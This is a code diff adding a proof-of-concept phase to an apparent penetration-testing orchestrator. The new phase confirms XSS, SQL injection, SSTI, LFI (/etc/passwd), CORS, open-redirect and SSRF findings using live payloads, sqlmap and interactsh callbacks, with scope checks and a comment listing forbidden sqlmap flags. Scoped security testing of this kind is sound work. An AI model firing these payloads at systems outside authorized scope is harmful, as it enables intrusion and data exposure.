@@ -12,6 +12,7 @@ Usage:
   python3 orchestrator.py --scope scope.yaml              # full run
   python3 orchestrator.py --scope scope.yaml --phase recon
   python3 orchestrator.py --scope scope.yaml --phase scan
+  python3 orchestrator.py --scope scope.yaml --phase poc
   python3 orchestrator.py --scope scope.yaml --phase report
   python3 orchestrator.py --scope scope.yaml --dry-run
 
@@ -518,6 +519,446 @@ def phase_scan(scope: dict, state: dict, output_dir: Path, log: logging.Logger, 
 
 
 # ---------------------------------------------------------------------------
+# PoC phase — prove exploitability without causing damage
+# ---------------------------------------------------------------------------
+
+# sqlmap flags that are safe for PoC: boolean + time-based blind only,
+# extract DB banner (version string) to prove injection — never dump data.
+_SQLMAP_SAFE_FLAGS = [
+    "--level=1", "--risk=1",
+    "--technique=BT",   # Boolean-blind + Time-based ONLY (no union/error/stacked)
+    "--batch",          # non-interactive
+    "--banner",         # DB version string — proves SQLi without touching user data
+    "--timeout=30",
+    "--retries=1",
+    "--no-cast",
+    "--disable-coloring",
+    # NEVER add: --dump, --dump-all, --os-shell, --os-cmd, --file-read, --file-write
+]
+
+# SSTI arithmetic payloads — if response contains "49", template injection confirmed
+_SSTI_PAYLOADS = [
+    "{{7*7}}",          # Jinja2, Twig
+    "${7*7}",           # FreeMarker, Mako
+    "<%= 7*7 %>",       # ERB
+    "#{7*7}",           # Ruby Haml
+    "*{7*7}",           # Spring Expression
+]
+
+# Safe XSS PoC payloads — proves execution without stealing anything
+_XSS_SAFE_PAYLOADS = [
+    "<img src=x onerror=alert(document.domain)>",
+    "\"><script>alert(document.domain)</script>",
+    "javascript:alert(document.domain)",
+]
+
+
+def _categorize(finding: dict) -> str:
+    """Map a nuclei finding to a PoC category."""
+    name = finding.get("name", "").lower()
+    tid = finding.get("template-id", "").lower()
+    tags = " ".join(finding.get("info", {}).get("tags", []))
+    combined = f"{name} {tid} {tags}"
+
+    for kw in ("xss", "cross-site-scripting"):
+        if kw in combined:
+            return "xss"
+    for kw in ("sqli", "sql-injection", "sql injection"):
+        if kw in combined:
+            return "sqli"
+    for kw in ("ssrf", "server-side request"):
+        if kw in combined:
+            return "ssrf"
+    for kw in ("open-redirect", "open redirect"):
+        if kw in combined:
+            return "redirect"
+    for kw in ("lfi", "path-traversal", "directory-traversal", "file-inclusion"):
+        if kw in combined:
+            return "lfi"
+    for kw in ("cors", "cross-origin"):
+        if kw in combined:
+            return "cors"
+    for kw in ("ssti", "template-injection", "template injection"):
+        if kw in combined:
+            return "ssti"
+    return "generic"
+
+
+def _poc_xss(finding: dict, scope: dict, output_dir: Path, log: logging.Logger) -> dict:
+    """Run dalfox for XSS PoC, fall back to manual curl confirmation."""
+    url = finding.get("matched-at", finding.get("url", finding.get("host", "")))
+    if not url or not is_in_scope(url, scope):
+        return {**finding, "poc_status": "skipped_scope"}
+
+    poc_dir = output_dir / "poc" / "xss"
+    poc_dir.mkdir(parents=True, exist_ok=True)
+
+    if tool_available("dalfox"):
+        log.info("dalfox XSS PoC: %s", url)
+        out = run_tool(
+            ["dalfox", "url", url, "--silence", "--format", "json",
+             "--output", str(poc_dir / "dalfox_result.json")],
+            timeout=120, log=log,
+        )
+        result_file = poc_dir / "dalfox_result.json"
+        if result_file.exists():
+            try:
+                results = json.loads(result_file.read_text())
+                if results:
+                    log.info("dalfox confirmed XSS at %s", url)
+                    return {**finding, "poc_status": "confirmed", "poc_tool": "dalfox",
+                            "poc_evidence": results[:3]}
+            except json.JSONDecodeError:
+                pass
+        return {**finding, "poc_status": "not_confirmed", "poc_tool": "dalfox"}
+
+    # Fallback: try payloads manually with curl
+    for payload in _XSS_SAFE_PAYLOADS:
+        import urllib.parse
+        test_url = url + ("&" if "?" in url else "?") + "q=" + urllib.parse.quote(payload)
+        if not is_in_scope(test_url, scope):
+            continue
+        try:
+            resp = requests.get(test_url, timeout=10, allow_redirects=True,
+                                headers={"User-Agent": "Mozilla/5.0"})
+            if payload.lower() in resp.text.lower():
+                log.info("XSS payload reflected at %s", url)
+                return {**finding, "poc_status": "reflected", "poc_payload": payload,
+                        "poc_note": "Payload reflected in response — verify execution in browser"}
+        except requests.RequestException:
+            pass
+    return {**finding, "poc_status": "needs_manual", "poc_note": "Dalfox not available; verify manually"}
+
+
+def _poc_sqli(finding: dict, scope: dict, output_dir: Path, log: logging.Logger) -> dict:
+    """Run sqlmap (banner only) to confirm SQL injection."""
+    url = finding.get("matched-at", finding.get("url", finding.get("host", "")))
+    if not url or not is_in_scope(url, scope):
+        return {**finding, "poc_status": "skipped_scope"}
+
+    if not tool_available("sqlmap"):
+        return {**finding, "poc_status": "needs_manual",
+                "poc_note": "sqlmap not installed — install: sudo dnf install sqlmap"}
+
+    poc_dir = output_dir / "poc" / "sqli"
+    poc_dir.mkdir(parents=True, exist_ok=True)
+    log.info("sqlmap PoC (banner only, technique=BT): %s", url)
+
+    out = run_tool(
+        ["sqlmap", "-u", url, "--output-dir", str(poc_dir)] + _SQLMAP_SAFE_FLAGS,
+        timeout=300, log=log,
+    )
+
+    if "is vulnerable" in out or "identified the following injection point" in out:
+        # Extract just the banner line, not full DB dump
+        banner_lines = [l for l in out.splitlines() if "banner" in l.lower() or "identified" in l.lower()]
+        return {**finding, "poc_status": "confirmed", "poc_tool": "sqlmap",
+                "poc_evidence": banner_lines[:5],
+                "poc_note": "DB banner extracted — injection confirmed without data access"}
+    if "might be injectable" in out:
+        return {**finding, "poc_status": "possible", "poc_tool": "sqlmap",
+                "poc_note": "sqlmap says possibly injectable — manual verification recommended"}
+    return {**finding, "poc_status": "not_confirmed", "poc_tool": "sqlmap"}
+
+
+def _poc_redirect(finding: dict, scope: dict, log: logging.Logger) -> dict:
+    """Confirm open redirect by following it to an external domain."""
+    url = finding.get("matched-at", finding.get("url", finding.get("host", "")))
+    if not url or not is_in_scope(url, scope):
+        return {**finding, "poc_status": "skipped_scope"}
+
+    test_url = url
+    redirect_param = "https://example.com"  # safe external domain for demonstration
+    if "url=" in url.lower() or "redirect=" in url.lower() or "next=" in url.lower():
+        import re
+        test_url = re.sub(r"(url|redirect|next|return|goto)=([^&]*)",
+                          lambda m: f"{m.group(1)}={redirect_param}", url, flags=re.IGNORECASE)
+    else:
+        sep = "&" if "?" in url else "?"
+        test_url = f"{url}{sep}url={redirect_param}"
+
+    if not is_in_scope(test_url.split("?")[0], scope):
+        return {**finding, "poc_status": "skipped_scope"}
+
+    try:
+        resp = requests.get(test_url, timeout=10, allow_redirects=False,
+                            headers={"User-Agent": "Mozilla/5.0"})
+        location = resp.headers.get("Location", "")
+        if "example.com" in location:
+            log.info("Open redirect confirmed: %s → %s", test_url, location)
+            return {**finding, "poc_status": "confirmed",
+                    "poc_url": test_url, "poc_evidence": {"Location": location},
+                    "poc_note": "Redirect to attacker-controlled domain confirmed"}
+        return {**finding, "poc_status": "not_confirmed",
+                "poc_note": f"No redirect observed (Location: {location or 'none'})"}
+    except requests.RequestException as exc:
+        return {**finding, "poc_status": "error", "poc_note": str(exc)}
+
+
+def _poc_cors(finding: dict, scope: dict, log: logging.Logger) -> dict:
+    """Check if CORS allows arbitrary origin with credentials."""
+    url = finding.get("matched-at", finding.get("url", finding.get("host", "")))
+    if not url or not is_in_scope(url, scope):
+        return {**finding, "poc_status": "skipped_scope"}
+
+    try:
+        resp = requests.get(url, timeout=10, allow_redirects=True,
+                            headers={"Origin": "https://evil.example.com",
+                                     "User-Agent": "Mozilla/5.0"})
+        acao = resp.headers.get("Access-Control-Allow-Origin", "")
+        acac = resp.headers.get("Access-Control-Allow-Credentials", "")
+        if "evil.example.com" in acao and "true" in acac.lower():
+            log.info("CORS misconfiguration confirmed (reflects origin + credentials): %s", url)
+            return {**finding, "poc_status": "confirmed",
+                    "poc_evidence": {"ACAO": acao, "ACAC": acac},
+                    "poc_note": "Arbitrary origin reflected AND credentials allowed — high impact"}
+        if "evil.example.com" in acao:
+            return {**finding, "poc_status": "partial",
+                    "poc_evidence": {"ACAO": acao, "ACAC": acac},
+                    "poc_note": "Origin reflected but no credentials — lower impact"}
+        return {**finding, "poc_status": "not_confirmed",
+                "poc_note": f"ACAO: {acao} | ACAC: {acac}"}
+    except requests.RequestException as exc:
+        return {**finding, "poc_status": "error", "poc_note": str(exc)}
+
+
+def _poc_lfi(finding: dict, scope: dict, log: logging.Logger) -> dict:
+    """Confirm LFI/path traversal by checking for /etc/passwd signature."""
+    url = finding.get("matched-at", finding.get("url", finding.get("host", "")))
+    if not url or not is_in_scope(url, scope):
+        return {**finding, "poc_status": "skipped_scope"}
+
+    traversals = [
+        "../../../../../../etc/passwd",
+        "....//....//....//etc/passwd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    ]
+    for payload in traversals:
+        import re
+        import urllib.parse
+        # Inject into any existing file-like parameter
+        test_url = re.sub(
+            r"(file|path|page|doc|template|name|include|load|read|dir)=([^&]*)",
+            lambda m: f"{m.group(1)}={urllib.parse.quote(payload)}",
+            url, flags=re.IGNORECASE,
+        )
+        if test_url == url:  # no param found — append
+            sep = "&" if "?" in url else "?"
+            test_url = f"{url}{sep}file={urllib.parse.quote(payload)}"
+        if not is_in_scope(test_url.split("?")[0], scope):
+            continue
+        try:
+            resp = requests.get(test_url, timeout=10, allow_redirects=True,
+                                headers={"User-Agent": "Mozilla/5.0"})
+            if "root:x:0:0" in resp.text or "root:!:" in resp.text:
+                log.info("LFI confirmed (/etc/passwd readable): %s", test_url)
+                return {**finding, "poc_status": "confirmed", "poc_url": test_url,
+                        "poc_payload": payload,
+                        "poc_evidence": "root:x:0:0 found in response",
+                        "poc_note": "Server-side file read confirmed — /etc/passwd returned"}
+        except requests.RequestException:
+            pass
+    return {**finding, "poc_status": "not_confirmed"}
+
+
+def _poc_ssti(finding: dict, scope: dict, log: logging.Logger) -> dict:
+    """Confirm SSTI by injecting arithmetic and checking for evaluated result."""
+    url = finding.get("matched-at", finding.get("url", finding.get("host", "")))
+    if not url or not is_in_scope(url, scope):
+        return {**finding, "poc_status": "skipped_scope"}
+
+    import urllib.parse
+    for payload in _SSTI_PAYLOADS:
+        sep = "&" if "?" in url else "?"
+        test_url = f"{url}{sep}q={urllib.parse.quote(payload)}"
+        if not is_in_scope(test_url.split("?")[0], scope):
+            continue
+        try:
+            resp = requests.get(test_url, timeout=10, allow_redirects=True,
+                                headers={"User-Agent": "Mozilla/5.0"})
+            if "49" in resp.text:
+                log.info("SSTI confirmed (arithmetic evaluated): %s payload=%s", url, payload)
+                return {**finding, "poc_status": "confirmed", "poc_payload": payload,
+                        "poc_note": "Template expression 7*7=49 evaluated — SSTI confirmed"}
+        except requests.RequestException:
+            pass
+    return {**finding, "poc_status": "not_confirmed"}
+
+
+def _poc_ssrf(finding: dict, scope: dict, log: logging.Logger) -> dict:
+    """
+    SSRF PoC via OOB callback. Uses interactsh-client if installed.
+    If not available, generates the manual test command for the report.
+    """
+    url = finding.get("matched-at", finding.get("url", finding.get("host", "")))
+    if not url or not is_in_scope(url, scope):
+        return {**finding, "poc_status": "skipped_scope"}
+
+    if not tool_available("interactsh-client"):
+        return {
+            **finding, "poc_status": "needs_manual",
+            "poc_note": (
+                "Install interactsh-client for automated SSRF PoC: "
+                "go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest\n"
+                "Manual test: interactsh-client -json then inject the domain into the SSRF parameter."
+            ),
+        }
+
+    # Start interactsh-client, grab its domain from first JSON line
+    try:
+        proc = subprocess.Popen(
+            ["interactsh-client", "-json", "-v"],
+            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
+        )
+        interact_domain = ""
+        for line in proc.stdout:  # type: ignore[union-attr]
+            line = line.strip()
+            if not line:
+                continue
+            try:
+                data = json.loads(line)
+                if "full-id" in data:
+                    interact_domain = data["full-id"] + ".interact.sh"
+                    break
+            except json.JSONDecodeError:
+                if ".interact.sh" in line:
+                    interact_domain = line.strip()
+                    break
+
+        if not interact_domain:
+            proc.kill()
+            return {**finding, "poc_status": "error", "poc_note": "Could not get interactsh domain"}
+
+        # Inject callback URL into likely SSRF parameters
+        import re
+        import urllib.parse
+        callback_url = f"http://{interact_domain}"
+        test_url = re.sub(
+            r"(url|uri|src|dest|redirect|path|host|target|endpoint|load|fetch|request)=([^&]*)",
+            lambda m: f"{m.group(1)}={urllib.parse.quote(callback_url)}",
+            url, flags=re.IGNORECASE,
+        )
+        if test_url == url:
+            sep = "&" if "?" in url else "?"
+            test_url = f"{url}{sep}url={urllib.parse.quote(callback_url)}"
+
+        if is_in_scope(test_url.split("?")[0], scope):
+            try:
+                requests.get(test_url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
+            except requests.RequestException:
+                pass
+
+        # Wait for callback
+        time.sleep(8)
+        callbacks = []
+        for line in proc.stdout:  # type: ignore[union-attr]
+            try:
+                cb = json.loads(line.strip())
+                if "remote-address" in cb:
+                    callbacks.append(cb)
+            except json.JSONDecodeError:
+                pass
+        proc.kill()
+
+        if callbacks:
+            log.info("SSRF confirmed via interactsh callback from: %s", url)
+            return {**finding, "poc_status": "confirmed",
+                    "poc_url": test_url, "poc_callback": interact_domain,
+                    "poc_evidence": callbacks[:2],
+                    "poc_note": "OOB DNS/HTTP callback received — SSRF confirmed"}
+        return {**finding, "poc_status": "not_confirmed",
+                "poc_note": f"No callback received to {interact_domain} — may need manual parameter targeting"}
+
+    except Exception as exc:
+        return {**finding, "poc_status": "error", "poc_note": str(exc)}
+
+
+def phase_poc(scope: dict, state: dict, output_dir: Path, log: logging.Logger, dry_run: bool) -> None:
+    """
+    Attempt non-destructive proof-of-concept for each triaged finding.
+
+    PoC rules enforced here:
+    - XSS: alert(document.domain) only — no credential harvesting
+    - SQLi: sqlmap --technique=BT --banner only — no data dump (no --dump ever)
+    - SSRF: OOB callback only — no internal network traversal
+    - LFI: /etc/passwd only — confirms read access without touching sensitive data
+    - SSTI: arithmetic (7*7=49) — no code execution
+    - Redirect: redirect to example.com — no phishing chain
+    - CORS: reflect evil origin — no actual cross-origin data theft
+    """
+    log.info("=== PHASE: POC ===")
+
+    triaged = state.get("triaged_findings", [])
+    if not triaged:
+        triaged_path = output_dir / "triaged_findings.json"
+        if triaged_path.exists():
+            triaged = json.loads(triaged_path.read_text())
+
+    if not triaged:
+        log.warning("No triaged findings to run PoC against. Run scan phase first.")
+        return
+
+    if dry_run:
+        for f in triaged:
+            log.info("[DRY-RUN] PoC would run for: %s → %s",
+                     f.get("name", "?"), _categorize(f))
+        return
+
+    (output_dir / "poc").mkdir(exist_ok=True)
+    delay = scope.get("rate_limit", {}).get("delay_between_hosts", 2)
+    poc_results: list[dict] = []
+
+    for idx, finding in enumerate(triaged):
+        category = _categorize(finding)
+        log.info("PoC [%d/%d] %s → %s", idx + 1, len(triaged), finding.get("name", "?"), category)
+
+        if category == "xss":
+            result = _poc_xss(finding, scope, output_dir, log)
+        elif category == "sqli":
+            result = _poc_sqli(finding, scope, output_dir, log)
+        elif category == "redirect":
+            result = _poc_redirect(finding, scope, log)
+        elif category == "cors":
+            result = _poc_cors(finding, scope, log)
+        elif category == "lfi":
+            result = _poc_lfi(finding, scope, log)
+        elif category == "ssti":
+            result = _poc_ssti(finding, scope, log)
+        elif category == "ssrf":
+            result = _poc_ssrf(finding, scope, log)
+        else:
+            result = {**finding, "poc_status": "not_applicable",
+                      "poc_note": "Generic finding — manually verify exploitability"}
+
+        status = result.get("poc_status", "?")
+        log.info("  → %s", status)
+        poc_results.append(result)
+        time.sleep(delay)
+
+    poc_path = output_dir / "poc_results.json"
+    poc_path.write_text(json.dumps(poc_results, indent=2))
+
+    confirmed = [r for r in poc_results if r.get("poc_status") == "confirmed"]
+    partial = [r for r in poc_results if r.get("poc_status") in ("reflected", "partial", "possible")]
+    manual = [r for r in poc_results if r.get("poc_status") in ("needs_manual", "not_confirmed")]
+
+    log.info("PoC summary: %d confirmed | %d partial | %d needs manual | %d not confirmed",
+             len(confirmed), len(partial), len(manual),
+             len(poc_results) - len(confirmed) - len(partial) - len(manual))
+
+    # Pass confirmed + partial findings to report phase
+    reportable = confirmed + partial
+    if reportable:
+        state["triaged_findings"] = reportable
+        log.info("%d finding(s) ready for report generation", len(reportable))
+    else:
+        log.info("No confirmed findings — check poc_results.json for needs_manual items")
+        state["triaged_findings"] = poc_results  # keep all so Claude can review
+
+    _save_state(state, output_dir)
+
+
+# ---------------------------------------------------------------------------
 # Report phase
 # ---------------------------------------------------------------------------
 
@@ -590,7 +1031,7 @@ def main() -> None:
     parser.add_argument("--scope", required=True, help="Path to scope.yaml")
     parser.add_argument(
         "--phase",
-        choices=["recon", "scan", "report", "all"],
+        choices=["recon", "scan", "poc", "report", "all"],
         default="all",
         help="Which phase to run (default: all)",
     )
@@ -623,6 +1064,9 @@ def main() -> None:
 
         if args.phase in ("scan", "all"):
             phase_scan(scope, state, output_dir, log, args.dry_run)
+
+        if args.phase in ("poc", "all"):
+            phase_poc(scope, state, output_dir, log, args.dry_run)
 
         if args.phase in ("report", "all"):
             phase_report(scope, state, output_dir, log, args.dry_run)
